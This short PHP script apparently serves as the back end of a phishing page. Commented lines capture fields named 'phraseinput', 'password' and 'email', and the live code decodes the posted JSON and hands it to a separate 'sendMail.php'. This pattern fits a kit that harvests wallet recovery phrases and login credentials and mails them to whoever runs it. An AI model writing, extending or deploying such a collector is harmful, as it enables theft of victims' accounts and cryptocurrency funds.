<?php

// $type = $_POST['type'] ?? '';
// $phraseinput = $_POST['phraseinput'] ?? '';
// $password = $_POST['password'] ?? '';
// $email = $_POST['email'] ?? '';


//     $data = [
//         'type' => $type,
//         'phraseinput' => $phraseinput,
//         'password' => $password,
//         'email' => $email
//     ];

// http_response_code(200);
// echo json_encode(["status" => 'success', "data" => $data]);

// Get the raw POST data
$json = file_get_contents('php://input');

// Decode the JSON string into a PHP associative array
$data = json_decode($json, true);

// Output the decoded data for debugging
require('sendMail.php');
// header('Content-Type: application/json'); // Set the content type to JSON
// echo json_encode($data); // Send the decoded data back as JSON